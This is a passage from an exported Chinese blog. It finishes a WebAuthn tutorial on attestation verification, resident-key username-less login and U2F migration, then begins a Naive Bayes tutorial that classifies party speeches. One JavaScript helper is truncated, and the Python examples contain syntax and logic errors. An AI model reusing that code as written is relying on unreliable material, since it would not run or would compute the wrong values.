可选的三个值吗？这个值会决定认证器最终使用哪种方式进行证明。复习一下：</p>\n<ul>\n<li>\n<code>none</code>：大部分情况下认证器会选择不进行证明，部分认证器会进行自证明。此时 AAGUID 会被 0 填充</li>\n<li>\n<code>indirect</code>：认证器会试图通过替换 AAGUID 和选择合适的证明方式来进行匿名证明，具体方式由认证器选择</li>\n<li>\n<code>direct</code>：认证器会提供最直接的证明信息</li>\n</ul>\n<p>注意，大部分情况下，当认证器需要向依赖方证明自己可信时需要提供认证器公钥，<strong>这会触发浏览器提示，只有用户同意后认证器才会进行证明，否则认证器将不提供证明。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/5.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/5.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"浏览器提示\" width=\"446\" height=\"283\" class=\"aligncenter size-full wp-image-2217\"></a>\n<blockquote><p>为什么浏览器会说“安全密钥的品牌和型号”？事实上，为了避免用户通过认证器证书被跨依赖方追踪，FIDO 要求使用相同认证器证书的认证器的数量不能少于 100,000。于是大部分认证器厂商会选择<strong>让同一型号的认证器共用同一份证书。</strong>因此，浏览器的会询问用户是否同意“查看安全密钥的品牌和型号”。</p></blockquote>\n<blockquote><p>Android Safety Net 不会向用户询问是否同意，而是会静默进行证明。</p></blockquote>\n<p>当证明不为空时，依赖方收到数据后根据 <code>attestationObject.fmt</code> 的不同，需要选择不同的验证方式来验证认证器的可信情况。出于篇幅原因，这里我们不会讨论每一种 <code>fmt</code> 的验证方式，更多信息你可以查阅 <a href=\"https://www.w3.org/TR/webauthn/#defined-attestation-formats\">W3C 文档</a>。</p>\n<p>当 <code>fmt</code> 为 <code>packed</code> 时，<code>attestationObject.attStmt</code> 可能会有三种格式：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">// 自证明\r\n{\r\n    alg, // 算法\r\n    sig // 签名\r\n}\r\n// 基础或证明 CA 证明\r\n{\r\n    alg,\r\n    sig,\r\n    x5c // X.509 证书链\r\n}\r\n// 椭圆曲线证明\r\n{\r\n    alg,\r\n    sig,\r\n    ecdaaKeyId // ECDAA-Issuer 公钥标识符\r\n}</pre>\n<p>此时，依赖方需要检查证书符合预期格式并检查证书是否在可信链上。首先，如果证明中既没有 <code>ecdaaKeyId</code> 也没有 <code>x5c</code>，就说明这个证明使用的是自证明，只需使用认证器提供的公钥验证即可；如果有 <code>x5c</code>，那么就需要验证 <code>x5c</code> 中的证书是否在可信链上。将 <code>x5c</code> 中的每个证书以 Base64 编码，按 64 个字符切开，并在头尾加上 <code>-----BEGIN CERTIFICATE-----</code> 和 <code>-----END CERTIFICATE-----</code>就能得到一个证书字符串了。之后，依赖方需要验证证书是否可信。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function base64ToPem(b64cert){\r\n    let pemcert = '';\r\n    for(let i = 0; i \n<p>这段代码来自 <a href=\"https://gist.github.com/herrjemand/dbeb2c2b76362052e5268224660b6fbc\">herrjemand</a></p>\n<p>至于 <code>ecdaaKeyId</code>，由于目前应用较少，处理方法可能需要你另寻资料了。检查证书的具体步骤已经超出了本文的范围，具体可以查阅<a href=\"https://medium.com/@herrjemand/verifying-fido2-packed-attestation-a067a9b2facd\">这篇文章</a>（英文）。</p>\n<blockquote><p>你可以在 <a href=\"https://fidoalliance.org/metadata/\">FIDO Metadata Service</a> 找到各大厂商认证器的可信证书链。</p></blockquote>\n<p>当在 Android 上调起 WebAuthn 时，大部分情况下 <code>fmt</code> 将会为 <code>safety-net</code>。此时 <code>attestationObject.attStmt</code> 的结构会是：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    ver: \"200616037\",\r\n    response: {\r\n        type: \"Buffer\",\r\n        data: [101, 121, 74, 104, 98, ..., 115, 104, 104, 82, 65]\r\n    }\r\n}</pre>\n<p>此时，<code>clientDataJSON</code> 中还会出现 <code>androidPackageName</code> 键，值是调起 WebAuthn 验证的应用的包名，如 Chrome 就是 \"com.android.chrome\"。</p>\n<p>在这个证明中，<code>data</code> 其实是一个 JWT 字符串，我们可以将它编码为字符串并将其按照 JWT 进行解码（别忘了验证 JWT 签名）。最终我们会得到一个类似这样的 Payload：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    nonce: \"0QAurN4F9wik6GEkblDJhGuf4kuaqZn5zaaxlvD1hlA=\",\r\n    timestampMs: 1584950686460,\r\n    apkPackageName: \"com.google.android.gms\",\r\n    apkDigestSha256: \"2BQHno+bmWWwdLUYylS8HLt5ESJzci3nt2uui71ojyE=\",\r\n    ctsProfileMatch: true,\r\n    apkCertificateDigestSha256: [\r\n        \"8P1sW0EPicslw7UzRsiXL64w+O50Ed+RBICtay2g24M=\"\r\n    ],\r\n    basicIntegrity: true,\r\n    evaluationType: \"BASIC\"\r\n}</pre>\n<p>其中包含了有关设备状态的一些信息。比如说，如果 <code>ctsProfileMatch</code> 为 <code>false</code>，那么该设备很有可能被 root 了。对于高安全要求的场景，我们可以视情况进行验证。</p>\n<p>同时我们可以在 JWT Header 中验证证明的有效性。我们应该能取得这样的 Header：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    alg: \"RS256\",\r\n    x5c: [\r\n        \"MIIFkzCCBHugAwIBAgIR...uvlyjOwAzXuMu7M+PWRc\",\r\n        \"MIIESjCCAzKgAwIBAgIN...UK4v4ZUN80atnZz1yg==\"\r\n    ]\r\n}</pre>\n<p>这里的结构就和上方的 <code>x5c</code> 验证类似了。具体步骤可以参考<a href=\"https://medium.com/@herrjemand/verifying-fido2-safetynet-attestation-bd261ce1978d\">这篇文章</a>（英文）。</p>\n<p>其他所有格式的验证方式也都可以在<a href=\"https://medium.com/@herrjemand/verifying-fido2-responses-4691288c8770\">这篇文章</a>（英文）中找到。<span></span></p>\n<h2>无用户名登录</h2>\n<p>认证器已经代替了密码，可是这还不够！在进行第一因素认证（即使用 WebAuthn 登录）时，我们还是需要输入用户名，然后才能进行身份认证。懒惰是第一生产力，我们能不能不输入用户名就进行身份认证呢？实际上，大部分认证器都允许我们无用户名登录。<strong>而这一特性的核心就是 Resident Key 客户端密钥驻留。</strong></p>\n<p>你可以思考一下，为什么普通的 WebAuthn 为什么不能实现无用户名登录？事实上，大部分认证器为了实现无限对公私钥，会将私钥通过 Key Warp 等技术加密后包含在凭证 ID 中发送给依赖方，这样认证器本身就不用存储任何信息。不过，这就导致需要身份认证时，依赖方必须通过用户名找到对应的凭证 ID，将其发送给认证器以供其算出私钥。</p>\n<blockquote><p>Yubikey 实现了一个基于 HMAC 的算法，认证器可以在私钥不离开认证器的前提下（常规的 Key Warp 算法中实际上私钥离开了认证器）通过一些输入和凭证 ID 重新计算私钥，你可以阅读<a href=\"https://www.yubico.com/blog/yubicos-u2f-key-wrapping/\">这篇文章</a>了解更多。</p></blockquote>\n<blockquote><p>客户端通过凭证 ID 查找对应认证器的算法根据系统的不同是不同的。通常凭证 ID 中会包含认证器信息，因此系统可以通过凭证 ID 找到对应的认证器。</p></blockquote>\n<p>要避免输入用户名，我们可以要求认证器将私钥在自己的内存中也存储一份。这样，依赖方无需提供凭证 ID，认证器就可以通过依赖方 ID 找到所需的私钥并签名公钥。以下是具体流程：</p>\n<p>注册时：</p>\n<ol>\n<li>依赖方请求新建凭证，同时要求启用客户端密钥</li>\n<li>认证器生成一对公私钥，并将私钥存储在永久内存中且与依赖方 ID 及用户 ID 绑定，随后将公钥发送给依赖方以供存储</li>\n<li>依赖方将用户 ID 即公钥与用户绑定</li>\n</ol><p>验证时：</p>\n<ol>\n<li>依赖方请求验证，但不必提供除依赖方 ID 以外的更多信息</li>\n<li>用户选择认证器</li>\n<li>认证器根据依赖方 ID 找到对应私钥</li>\n<li>如果有多个对应私钥，认证器会询问用户应该使用哪个身份信息登录</li>\n<li>确定私钥后，认证器签名挑战并将其返回，同时返回用户 ID</li>\n<li>依赖方通过用户 ID 找到对应用户并用对应公钥检查签名，正确则允许对应用户登录</li>\n</ol><blockquote><p>可以看到，这个特性同时要求认证器存储用户 ID，即上面提到过的 <code>userHandle</code>。依赖方需要根据此信息找到对应用户，因此不支持 <code>userHandle</code> 的 U2F 认证器无法进行无用户名登录。</p></blockquote>\n<blockquote><p>如之前所说，<strong>认证器能永久存储的私钥数量是有限的</strong>，因此只应在真正需要无用户名登录的时候启用此特性。</p></blockquote>\n<blockquote><p>目前暂时没有办法检测认证器是否支持客户端密钥驻留，因此在无用户名验证失败时应 fallback 至常规的 WebAuthn 验证，即向用户询问用户名。</p></blockquote>\n<p>现在让我们来看看如何实现这一特性吧。首先，调用 <code>navigator.credentials.create()</code> 时我们需要注意两个参数：<code>requireResidentKey</code> 必须为 <code>true</code>，<code>userVerification</code> 必须为 \"required\"。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"5-6\">navigator.credentials.create({\r\n    publicKey: {\r\n        ...\r\n        authenticatorSelection: {\r\n            requireResidentKey: true,\r\n            userVerification: \"required\"\r\n            ...\r\n        },\r\n        ...\r\n    }\r\n})</pre>\n<blockquote><p>Windows Hello <strong>似乎</strong>会存储所有已注册的凭据，因此无论是否指定 <code>requireResidentKey</code>，你都可以通过 Windows Hello 进行无用户名登录。</p></blockquote>\n<p>随后，浏览器会询问用户是否允许认证器存储私钥。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"浏览器提示\" width=\"445\" height=\"285\" class=\"aligncenter size-full wp-image-2208\"></a>\n<p>如果用户同意，认证器会存储私钥，并和普通的 WebAuthn 一样返回信息。不过，依赖方收到数据之后，只需将公钥、用户 ID 与用户关联起来，而不必再将凭证 ID 与用户关联起来。至此注册完成。</p>\n<p>之后，在用户请求登录时，无需再向依赖方提供用户名。同时在传入 <code>navigator.credentials.get()</code> 的参数中也有两个需要注意：<code>userVerification</code> 必须为 \"required\"，同时 <code>allowCredentials</code> 必须为空。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"4-5\">navigator.credentials.get({\r\n    publicKey: {\r\n        ...\r\n        userVerification: \"required\",\r\n        allowCredentials: [],\r\n        ...\r\n    }\r\n})</pre>\n<blockquote><p>Android 暂不支持无用户名验证，空的 <code>allowCredentials</code> 会导致浏览器返回 <code>NotSupportedError</code> 错误。</p></blockquote>\n<p>此时，认证器会根据依赖方 ID 找到对应的私钥。如果有多个对应私钥，认证器会询问用户应该使用哪个身份信息登录。用户选择后，认证器就会使用对应的私钥签名挑战并将其返回。此时，<code>userHandle</code> 一定不为空。</p>\n<p>依赖方收到数据后，需要将 <code>userHandle</code> 作为用户 ID 找到对应的用户，并使用对应的公钥验证签名。如果验证成功，则认为对应的用户身份认证成功，依赖方可以允许其登录。至此验证结束。</p>\n<blockquote><p>有的时候你可能会需要清除认证器中的密钥。绝大多数认证器都提供了对应的软件以供清除存储的密钥，但大部分情况下这会重置整个认证器，这意味着相关认证器此前的所有凭证均会失效。因此建议不要将日常使用的认证器作为开发测试用的认证器。</p></blockquote>\n<h2>从 U2F 认证迁移</h2>\n<p>如果你的服务此前提供了 U2F 第二因素认证，你可能会希望在将依赖方从 U2F 升级到 WebAuthn 时用户此前注册的 U2F 认证器仍然可用而无需重新注册。由于 WebAuthn 向后兼容 U2F 设备，用户是可以继续使用原有的 U2F 认证器的。不过，由于 WebAuthn 的依赖方 ID 与 U2F 的 <code>appid</code> 并不一定相同，你需要将原有的 U2F <code>appid</code> 随 WebAuthn 流程一起传递给认证器，认证器才能使用正确的私钥进行响应。</p>\n<p>要实现这一点，我们只需要在注册及认证仪式中使用 WebAuthn 的 <code>appid</code> 扩展。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">extensions: {\r\n    appid: \"https://example.com\" //U2F appid\r\n}</pre>\n<p>此时认证器便可以得到正确的私钥，之后的流程与正常情况一致；依赖方除了正常的 WebAuthn 流程外，不需要再做任何其它操作。</p>\n<h2>拓展阅读</h2>\n<p>我们的 WebAuthn 之旅到这里就真的结束了。不过，你仍然可以自行探究，了解更多。<strong>本文只是一个粗浅的使用指南</strong>，而被称为“Web 身份认证的未来”的 WebAuthn 的深层还要很多细节值得我们挖掘学习，不过本文不会再继续讨论了。</p>\n<p>如果你想了解更多关于 WebAuthn 的信息，最好的方法是直接阅读 <a href=\"https://www.w3.org/TR/webauthn\">W3C 规范</a>。此外，Yubico 也提供了不错的 <a href=\"https://developers.yubico.com/WebAuthn/WebAuthn_Developer_Guide/\">WebAuthn 文档</a>。</p>\n<p>要了解更多认证器存储凭证的信息，你可以阅读<a href=\"https://duo.com/labs/tech-notes/how-security-keys-store-credentials\">这篇文章</a>（英文）。</p>\n<p>如果你想了解更多 Android Safety Net 是怎样运作的，可以观看<a href=\"https://youtu.be/8lv_9mydrjg\">这个视频</a>，并通过 <a href=\"https://developer.android.com/training/safetynet/attestation\">Google 的文档</a>了解 Android Safety Net 的更多信息。</p>\n<p>如果你想方便地调试 WebAuthn，<a href=\"https://webauthn.me/\">webauthn.me</a> 提供了一个非常直观方便的<a href=\"https://webauthn.me/debugger\">调试器</a>。</p>\n<h1>参考资料</h1>\n<p><a href=\"https://www.w3.org/TR/webauthn\">WebAuthn Level 1 规范 - W3C</a><br><a href=\"https://github.com/w3c/webauthn\">WebAuthn Level 2 草案 - W3C</a><br><a href=\"https://blog.techbridge.cc/2019/08/17/webauthn-intro/\">一起来了解Web Authentication - TechBridge 技术共笔部落格</a><br><a href=\"https://medium.com/@herrjemand/introduction-to-webauthn-api-5fd1fb46c285\">Introduction to WebAuthn API - Medium</a><br><a href=\"https://medium.com/@herrjemand/verifying-fido2-responses-4691288c8770\">WebAuthn/FIDO2: Verifying responses - Medium</a><br><a href=\"https://obeta.me/posts/2019-03-01/WebAuthn%E4%BB%8B%E7%BB%8D%E4%B8%8E%E4%BD%BF%E7%94%A8\">WebAuthn介绍与使用 - obeta</a><br><a href=\"https://webauthn.io/\">webauthn.io</a><br><a href=\"https://webauthn.guide/\">webauthn.guide</a><br><a href=\"https://webauthn.me/\">webauthn.me</a><br><a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API/Attestation_and_Assertion\">Attestation and Assertion - MDN</a><br><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Authentication_API\">Web Authentication API - MDN</a>（顺便翻译了一半）<br><a href=\"https://fidoalliance.org/fido-technotes-the-truth-about-attestation/\">FIDO TechNotes: The Truth about Attestation - FIDO Alliance</a><br><a href=\"https://developers.yubico.com/WebAuthn/WebAuthn_Developer_Guide/\">WebAuthn Developer Guide - Yubico</a><br><a href=\"https://en.wikipedia.org/wiki/WebAuthn\">WebAuthn - Wikipedia</a><br><a href=\"https://techcommunity.microsoft.com/t5/identity-standards-blog/all-about-fido2-ctap2-and-webauthn/ba-p/288910\">All about FIDO2, CTAP2 and WebAuthn - Microsoft Tech Community</a><br><a href=\"https://webauthn-doc.spomky-labs.com/\">Webauthn Framework</a><br><a href=\"https://zhuanlan.zhihu.com/p/25279015\">如何开发支持 FIDO U2F 登录的网站 - 知乎专栏</a><br></p></pre>\n","link":"https://flyhigher.top/develop/2160.html"},{"title":"NLP 找门：用朴素贝叶斯进行文本分类","date":"2020-01-29 11:39:58","description":"\n<blockquote>\n<p>有一天，神收到了一封垃圾邮件，于是世界上就有了朴素贝叶斯算法。</p>\n<footer>——我瞎编的</footer>\n</blockquote>\n<p>为什么这篇文章的标题是 NLP 找门呢？因为如果你看完了这篇文章，你就可以<strong>准备入门</strong>自然语言处理 (<strong>N</strong>atural <strong>L</strong>anguage <strong>P</strong>rocessing) 了。我会把这篇文章当作一篇彻彻底底的 NLP 入门文章来写，尽量避免“专业高端”词汇和“全是奇怪符号”的式子，这样<strong>只要你有高中数学基础</strong>，就能毫无压力地看完这篇文章，学会使用朴素贝叶斯分类算法分类文本。</p>\n<p>让我们开始吧。</p>\n<h1>所以，啥是朴素贝叶斯？</h1>\n<p>简单来说，朴素贝叶斯 (Naïve Bayes) <strong>是一个简单但高效的分类算法</strong>，在进行不复杂的文本分类时高效且拥有不低的准确度，判断垃圾邮件就是用朴素贝叶斯进行文本分类的一个经典例子。当然朴素贝叶斯分类不仅能用在 NLP 中，在许多分类问题中朴素贝叶斯也有非常好的效果，但我们今天只关注它在 NLP 中的应用。</p>\n<p>要了解朴素贝叶斯，我们要先来了解一下贝叶斯定理。</p>\n<blockquote>\n<p>每增加一个数学公式都会使读者减半。</p>\n<footer>——霍金</footer>\n</blockquote>\n<p>那么，就让我们先来看看贝叶斯定理的公式吧（笑</p>\n<p>$$P(A|B) = \\frac{P(AB)}{P(B)} = \\frac{P(B|A)P(A)}{P(B)}$$</p>\n<p>其实还是很简单的，运用高中的条件概率知识就能理解。本质上，贝叶斯定理给出了一种方法，使得我们可以在 \\(P(A|B)\\) 和 \\(P(B|A)\\) 之间互相转换，因为通常情况下它们是不一样的。</p>\n<p>要更好地理解，请考虑这样一个例子：</p>\n<blockquote><p>假设有一个学校图书馆，图书管理员正为找不到某本书而发愁。已知老师有 70% 的意愿借走这本书，而是学生的意愿是 30%，这个学校的师生比例是 1:10，那么借走这本书的人是老师的概率有多大？</p></blockquote>\n<p>设学校总人数为 \\(T\\)，我们可以很容易地写出这样的一个式子：</p>\n<p>$$\\begin{align} P &amp; = \\frac{T\\cdot\\frac{1}{11}\\cdot 70\\%}{T\\cdot\\frac{1}{11}\\cdot 70\\%+T\\cdot\\frac{10}{11}\\cdot 30\\%} \\\\ &amp; = \\frac{70\\%}{70\\%+10\\times30\\%} \\\\ &amp; = \\frac{7}{37} \\end{align}$$</p>\n<p>这就是贝叶斯定理了！等等，你可能会挠挠头，这哪里是贝叶斯了？别急，如果我们把最上面的式子换个字母的话…</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)}$$</p>\n<p>在这里，\\(H\\) 指 Hypothesis，即假设，而 \\(E\\) 指 Evidence，即证据。这样，这个式子就很好理解了，在我们上面的例子里，借走书是证据，那么 \\(P(E)\\) 就是某个人选择借走这本书的概率；这个人是老师是假设，那么这个人是老师的概率是 \\(P(H)\\)。<strong>注意这里的概率指在学校中抽一个人是老师的概率，并不是“在借走书的前提下”这个人是老师的概率</strong>，而“在借走书的前提下”这个人是老师的概率应该是 \\(P(H|E)\\)，也正是我们要求的概率。同样地，而“这个人是老师”的前提下借走书的概率就是 \\(P(E|H)\\) 了。</p>\n<p>那么再来看看上面我们凭小学知识就列出的计算式，如果把里面的具体数据换成概率来表示的话，这个式子就会变成…</p>\n<p>$$P(H|E) = \\frac{T\\cdot P(E|H)P(H)}{T\\cdot P(E|H)P(H) + T\\cdot P(E|\\neg H)P(\\neg H)}$$</p>\n<p>好吧，这里解释一下，\\(\\neg\\) 符号表示“非”，所以 \\(P(E|\\neg H)\\) 表示在“这个人不是老师”的前提下借走书的概率。而 \\(T\\cdot P(E|H)P(H)\\) + \\(T\\cdot P(E|\\neg H)P(\\neg H)\\)，即“可能借走书的老师的数量 + 可能借走书的学生的数量”，就是“可能借走书的人的数量”了，也就是 \\(T\\cdot P(E)\\)。上下消去 \\(T\\)，我们就能得到上面的式子了。</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)}$$</p>\n<p>这就是贝叶斯了定理。如果你还是不太清楚，可以去看看 3Blue1Brown 的<a href=\"https://www.bilibili.com/video/av84799361\">这个视频</a>，图形化的讲解会清晰很多。</p>\n<p>这里我要提一下这个式子里各部分的专有名称了（“专业高端”词汇警告），你可以不记住，直接看后面。</p>\n<ul>\n<li>\\(P(H|E)\\) 叫做 \\(H\\) 的<strong>后验概率</strong>，反之亦然</li>\n<li>\\(P(H)\\) 叫做 \\(H\\) 的<strong>先验概率</strong>，反之亦然</li>\n<li>特别地，我们把 \\(P(E|H)\\) 称作<strong>“似然值”</strong>，即 likelihood</li>\n</ul>\n<p>那什么是朴素贝叶斯呢？按上面所说的，朴素贝叶斯是一种分类算法。简单来说，朴素贝叶斯将一个对象的各个特征考虑为互相独立，然后根据这些特征的概率的乘积来判断对象所属的分类。基本原理如下：</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)} \\propto P(E|H)P(H) = P(H)\\prod_{i}P(W_i|H)$$</p>\n<p>在这里，\\(W_i\\) 指某一对象的第 \\(i\\) 个特征，对于文本分类来说，这就是一段文本中的某个单词。</p>\n<p>朴素贝叶斯之所以“朴素”，是因为它要求<strong>各个特征间是独立的</strong>，在文本分类中也就是各个单词之间互不干扰。虽然思路简单的代价是适用范围变窄，不过由于这样的简化在很多情况下已经足够了，因此实际上朴素贝叶斯的应用范围非常广。<del>你看朴素贝叶斯 <strong>N</strong>aïve <strong>B</strong>ayes 的缩写都是 NB 了，能不厉害吗（逃</del></p>\n<h1>那么，咋分类啊</h1>\n<p>看来你这下完全听懂了呢（笑），是时候看看如何在 NLP 中应用朴素贝叶斯了。和上面一样，我们用一个具体的例子来说明。我们的目标是让电脑学会分类美国共和党和民主党的演讲稿，由于两个党派的演讲风格不同，所以这样的分类在理论上是可行的。</p>\n<div class=\"wp-block-file\">\n<a href=\"https://acdn.flyhigher.top/nlp/material.zip\" download>material.zip</a><a href=\"https://acdn.flyhigher.top/nlp/material.zip\" class=\"wp-block-file__button\" download>下载</a>\n</div>\n<p>上面我们要用到的数据集，你可以下载下来一起动手玩一玩。先说一下数据集的数据结构吧，压缩包里有两个文件，<code>train.txt</code> 将会被当作训练数据集，而 <code>test.txt</code> 则会作为训练结束后的验证数据集。两个文本文件里数据的结构是类似的，就像这样：</p>\n<pre class=\"EnlighterJSRAW\">BLUE WELL I AM SO HONORED AND PERSONALLY UNKNOWNWORD TO BE HERE...\r\nRED THANK YOU . THIS IS QUITE AN INSTITUTION . IT'S GOOD TO BE...</pre>\n<p>每行都是一篇演讲稿，每行的第一个单词指明了这篇演讲稿所属的党派，<code>RED</code> 指共和党，而 <code>BLUE</code> 指民主党。所有单词和符号都已经被转为大写并由空格分隔方便处理。<code>train.txt</code> 有共和党演讲稿和民主党演讲稿各 23 篇，<code>test.txt</code> 有 6 篇共和党演讲稿，12 篇民主党演讲稿。</p>\n<p>明白了？那我们就开始吧。</p>\n<h2>捋捋思路</h2>\n<p>首先，我们需要考虑如何在文本分类中应用朴素贝叶斯。很简单，按朴素贝叶斯的思路，<strong>计算每个词在某一分类下的出现概率，然后将某篇文章的所有词的概率相乘，再乘以该分类的先验概率，就可以得到某篇文章在某一分类下的概率。</strong></p>\n<p>$$P(Class|Article) = P(Class)\\prod_{i}P(Word_i|Class)$$</p>\n<p>各个分类概率都计算完成后，概率最高的那个分类就是这篇文章可能所属的分类。这个思路的核心就是用词决定了文本风格，文本的不同类别用词会有差异，只要能量化这些差异就可以分类文本。在我们的例子中，我们可以从 <code>train.txt</code> 中统计各个词汇的出现情况，然后用 <code>test.txt</code> 中的数据按上面的算法验证我们算法的准确性。</p>\n<p>这个思路很简单也很清晰，但还有一些问题需要解决。<strong>第一，有的时候，我们的测试数据集中可能会出现一个在训练数据集中没有出现过的词语。这个时候，朴素贝叶斯的计算结果会是 0。</strong>如果我们把 0 乘进式子中，那就别想得到正常的结果了。所以，我们还需要对计算某一单词在某一分类中的式子稍加改进。使用拉普拉斯平滑，就可以避免出现概率为 0 的情况。别被名字吓到，拉普拉斯平滑是一种非常简单的平滑方法：在分子上 +1，在分母上加整个取值范围，这样就可以给整个分式加上非常微小的偏移，避免出现 0。</p>\n<p>$$\\begin{align} P(Word_i|Class) &amp; = \\frac{Word_iCountInClass}{AllWordCountInClass} \\\\ &amp; \\approx \\frac{Word_iCountInClass + 1}{AllWordCountInClass + UniqueWordCount} \\end{align}$$</p>\n<p><strong>第二，对于长文本，大部分词语在某一分类中的出现概率是远小于 1 的，加上长文本词汇量大，往往概率相乘的结果会非常小。</strong>受限于计算机处理浮点数的原理，精确处理这么小的数字是很麻烦的。幸好，运用一些简单的数学知识就可以将其转化为更精确的表达，<strong>那就是取对数。</strong></p>\n<p>首先，将概率计算结果取对数并不影响我们的计算结果。因为取对数是一个单调递增的操作，而我们计算概率只是为了排序选择概率最高的分类，因此取对数是不影响我们排序的。而把多项式取对数，等于把多项式的每一项取对数后相加。所以我们有：</p>\n<p>$$\\lg{\\Big(P(Class)\\prod_{i}P(Word_i|Class)\\Big)} = \\lg{P(Class)} + \\sum_i\\lg{P(Word_i|Class)}$$</p>\n<p>大部分情况下，在每一次取对数的时候，要取对数的数字的大小，即 \\(P(Word_i|Class)\\) 尚还在计算机能处理的范围内，<strong>因此我们可以放心地使用取对数的方法</strong>，避免计算机精度不够影响结果。</p>\n<p><strong>第三就是在某些情况下，可能会有部分词语干扰计算结果</strong>，如 and, is 这类的被大量使用的中性词。如果希望得到更好的结果，我们可以维护一个停用词表，在计算时排除停用词即可。或者，我们可以在计算完每个单词的出现数量后，排除数量最多的前 \\(N\\) 个单词，避免这些单词过多地影响计算。</p>\n<h2>写点代码</h2>\n<p>现在我们终于可以开始实战，写点代码了。我会用简单的 Python 来表达思路。好了，理一理思绪，第一步我们要做的，是统计训练数据集中的用词情况。具体来说，根据上面的思考，我们需要统计的有：</p>\n<ul>\n<li>每个单词在各分类中出现的数量</li>\n<li>各分类中的不重复词数量</li>\n</ul>\n<p>用 Python 简单表示如下：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"python\">#读入数据过程略...\r\ndata_raw = \"读入的数据\".split('\\n') #按行分隔\r\ndata_blue = []\r\ndata_red = []\r\nword_count_blue = {}\r\nword_count_red = {}\r\n\r\nfor line_data in data_raw:\r\n    word_list = line_data.split(\" \") #分隔单词\r\n    if word_list[0] == \"BLUE\":\r\n        for i in range(1,len(word_list)):\r\n            if not is_excluded(word_list[i]): #判断是否为停用词\r\n                data_blue.append(word_list[i])\r\n                #统计单词出现次数\r\n                word_count_blue.setdefault(word_list[i], 0)\r\n                word_count_blue[word_list[i]] += 1\r\n    elif if word_list[0] == \"RED\":\r\n        #Class = red 时同理...\r\n\r\n#统计非重复词\r\nunique_words_blue = list(set(data_blue))\r\nunique_words_red = list(set(data_red))</pre>\n<p>训练过程到这里就结束了，计算机已经知道了各政党演讲的用词习惯。很简单吧？接下来我们就要使用测试数据集来测试准确度了。<strong>这里开始就涉及到朴素贝叶斯的计算了</strong>，可能会稍微复杂一点点。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"python\">import math\r\n#读入测试数据过程略...\r\ntest_data_raw = \"读入的数据\".split('\\n') #按行分隔\r\ntest_data = []\r\n\r\nfor for line_data in test_data_raw:\r\n    if line_data[0] == \"BLUE\":\r\n        content_data = line_data.split(\" \").pop(0)\r\n        test_data.append({\"class\": \"blue\", \"content\": content_data})\r\n\r\nfor line_data in test_data:\r\n    if line_data[\"class\"] == 'blue':\r\n        posibility_blue = 0\r\n        for word in line_data[\"content\"]:\r\n            #计算各单词概率，取对数后相加，使用了拉普拉斯平滑\r\n            if word in word_count_blue:\r\n                posibility_blue += math.log((word_count_blue[word]+1)/(len(data_blue)+len(unique_words_blue)+len(unique_words_red)))\r\n            else:\r\n                posibility_blue += math.log(1/(len(data_blue)+len(unique_words_blue)+len(unique_words_red)))\r\n        #最后加上该分类概率的对数\r\n        posibility_blue += math.log(len(data_blue/((len(data_blue)+(len(data_red)))\r\n    elif line_data[\"class\"] == 'red':\r\n        #Class = red 时同理...</pre>\n<p>计算完成后，我们就得到每篇演讲稿在各分类下的概率了。之后，简单的比较就能得出推断的分类：如果 \\(P(Red|Article)\\) 大于 \\(P(Blue|Article)\\)，那么这篇演讲稿就更可能是共和党的演讲稿，反之则是民主党的演讲稿。</p>\n<p>很好理解吧？那么这么简单的思路，准确性怎么样呢？对于我们的例子，这是我设置了个别停用词后的结果：</p>\n<pre class=\"EnlighterJSRAW\">+-----+-------+--------------+--------------+-------+-------+\r\n|   ID|  Class|        P(Red)|       P(Blue)|  Guess| Status|\r\n+-----+-------+--------------+--------------+-------+-------+\r\n|    1|   Blue|  -23204.68377|  -22998.67066|   Blue|      √|\r\n|    2|   Blue|  -16438.44625|  -16137.48257|   Blue|      √|\r\n|    3|   Blue|  -33468.81214|  -32567.61801|   Blue|      √|\r\n|    4|   Blue|    -8606.2193|   -8601.50426|   Blue|      √|\r\n|    5|   Blue|  -12430.97436|  -11935.70662|   Blue|      √|\r\n|    6|   Blue|  -44033.02883|  -43877.55367|   Blue|      √|\r\n|    7|   Blue|   -16947.2851|  -16758.57542|   Blue|      √|\r\n|    8|   Blue|  -26957.26997|  -26889.62444|   Blue|      √|\r\n|    9|   Blue|  -27503.73985|  -27249.21828|   Blue|      √|\r\n|   10|   Blue|   -20528.4457|   -19991.1248|   Blue|      √|\r\n|   11|   Blue|  -20337.96493|  -19860.12831|   Blue|      √|\r\n|   12|   Blue|  -28409.28489|  -28118.98017|   Blue|      √|\r\n|   13|    Red|  -13756.01015|  -14488.11751|    Red|      √|\r\n|   14|    Red|  -17221.22732|  -17710.15936|    Red|      √|\r\n|   15|    Red|  -17397.45136|  -17899.98659|    Red|      √|\r\n|   16|    Red|  -10724.69095|  -11092.77837|    Red|      √|\r\n|   17|    Red|  -10402.40027|  -10859.48681|    Red|      √|\r\n|   18|    Red|   -9371.53792|    -9669.6769|    Red|      √|\r\n+-----+-------+--------------+--------------+-------+-------+\r\n|                                      Total: 18/18, 100.0% |\r\n+-----------------------------------------------------------+</pre>\n<p><strong>100% 